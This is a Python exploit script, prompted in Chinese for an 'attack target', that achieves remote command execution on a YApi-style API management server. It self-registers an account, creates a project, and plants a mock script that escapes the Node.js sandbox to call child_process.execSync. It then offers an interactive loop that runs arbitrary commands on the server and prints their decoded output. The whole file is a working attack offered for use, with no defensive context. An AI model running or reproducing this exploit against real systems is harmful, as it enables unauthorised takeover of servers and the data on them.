import requests
import json
import random
import string
import os
import sys
import base64
import click

@click.command()
@click.option('--target', prompt="输入你的攻击目标", help='目标URL')
def main(target):
    url = target
    cmd = "id"
    id = ''.join(random.sample(string.ascii_letters + string.digits, 8))
    defaultpayload = "const sandbox = this\nconst ObjectConstructor = this.constructor\nconst FunctionConstructor = ObjectConstructor.constructor\nconst Buffer =  new FunctionConstructor('return Buffer')()\nconst process = new FunctionConstructor('return process')()\ncmd  = new Buffer('d2hvYW1p','base64').toString()\n\nmockJson = new Buffer(process.mainModule.require(\"child_process\").execSync(cmd).toString()).toString('base64')"
    try:
        header = {
            "Content-Type": "application/json;charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        data = {
            "email":id+"@gmail.com",
            "password":id,
            "username":id
        }
        reg = requests.post(url+"/api/user/reg",headers=header,timeout=5,data=json.dumps(data))
        print(reg.json())
        if(reg.json()['errcode']==0):
            print("注册成功")
        else:
            exit("注册失败")
        login = requests.post(url+"/api/user/login",headers=header,timeout=5,data=json.dumps(data))
        print(login.json())
        if(login.json()['errcode']==0):
            print("登录成功")
        else:
            exit("登陆失败")
        header['Cookie'] = login.headers['Set-Cookie'].split(";")[0]+"; _yapi_uid="+str(login.json()['data']['uid'])
        #print(requests.post(url+"/api/user/reg",headers=header,timeout=5,data=json.dumps(data)).json())
        group_id = requests.get(url+"/api/group/list",headers=header,timeout=5).json()['data'][0]['_id']
        #print("当前用户组")
        #print(group_id)
        data = {
            "name":id,"group_id":group_id,"icon":"code-o","color":"pink","project_type":"private"
        }
        projid = requests.post(url+"/api/project/add",headers=header,timeout=5,data=json.dumps(data)).json()['data']['_id']
        #print("当前项目")
        #print(projid)
        payload = defaultpayload.replace("d2hvYW1p", base64.b64encode(cmd.encode()).decode())
        data = {
            "id":projid,"project_mock_script":"const sandbox = this;const ObjectConstructor = this.constructor;const FunctionConstructor = ObjectConstructor.constructor;;const Buffer =  new FunctionConstructor('return Buffer')();const process = new FunctionConstructor('return process')();;cmd  = new Buffer('d2hvYW1p','base64').toString();;mockJson = new Buffer(process.mainModule.require(\"child_process\").execSync(cmd).toString()).toString('base64')","is_mock_open":True
        }
        up = requests.post(url+"/api/project/up",headers=header,timeout=5,data=json.dumps(data)).json()
        #print(up)
        catid = requests.get(url+"/api/interface/list_menu?project_id="+str(projid),headers=header,timeout=5).json()['data'][0]['_id']
        #print(catid)
        data = {"method":"GET","catid":catid,"title":id,"path":"/"+id,"project_id":projid}
        api = requests.post(url+"/api/interface/add",headers=header,timeout=5,data=json.dumps(data)).json()
        #print(api)
        print(url+"/mock/"+str(projid)+"/"+id)
        print("cmd:")
        print(cmd)
        print("out:")
        print(base64.b64decode(requests.get(url+"/mock/"+str(projid)+"/"+id,headers=header,timeout=5).text).decode().strip())
        while True:
            cmd = input("cmd:\n")
            payload = defaultpayload.replace("d2hvYW1p", base64.b64encode(cmd.encode()).decode())
            data = {
                "id":projid,"project_mock_script":payload,"is_mock_open":True
            }
            up = requests.post(url+"/api/project/up",headers=header,timeout=5,data=json.dumps(data)).json()
            out = requests.get(url+"/mock/"+str(projid)+"/"+id,headers=header,timeout=5).text.encode()
            print("out:")
            try:
                print(base64.b64decode(out).decode().strip())
            except:
                pass
                print("无回显，或者解码失败")
    except:
        print("Unexpected error:", sys.exc_info()[0])
        raise
if __name__ == "__main__":
    main()